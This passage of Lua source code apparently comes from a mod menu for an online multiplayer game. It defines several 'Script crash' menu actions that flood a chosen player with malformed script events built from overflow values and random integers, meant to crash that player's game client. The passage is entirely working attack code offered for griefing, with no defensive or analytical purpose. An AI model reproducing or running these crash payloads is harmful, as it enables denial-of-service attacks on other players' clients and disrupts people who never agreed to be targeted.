        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(scrashes, "Script crash 8", {"scrashv8"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
                util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(scrashes, "Script crash 9", {"scrashv9"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(scrashes, "Powerfull Script Crash", {"scrashv10"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
                util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
                util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
                util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
                util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
                util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
                util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
                util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
                util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
                util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
                util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
                util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
                util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
                util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
                util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
                util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
                util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
                util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
                util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
                util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(scrashes, "Script crash 10", {"scrashv11"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(scrashes, "Script crash 11", {"scrashv12"}, "", function()
        for i = 1, 50 do
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
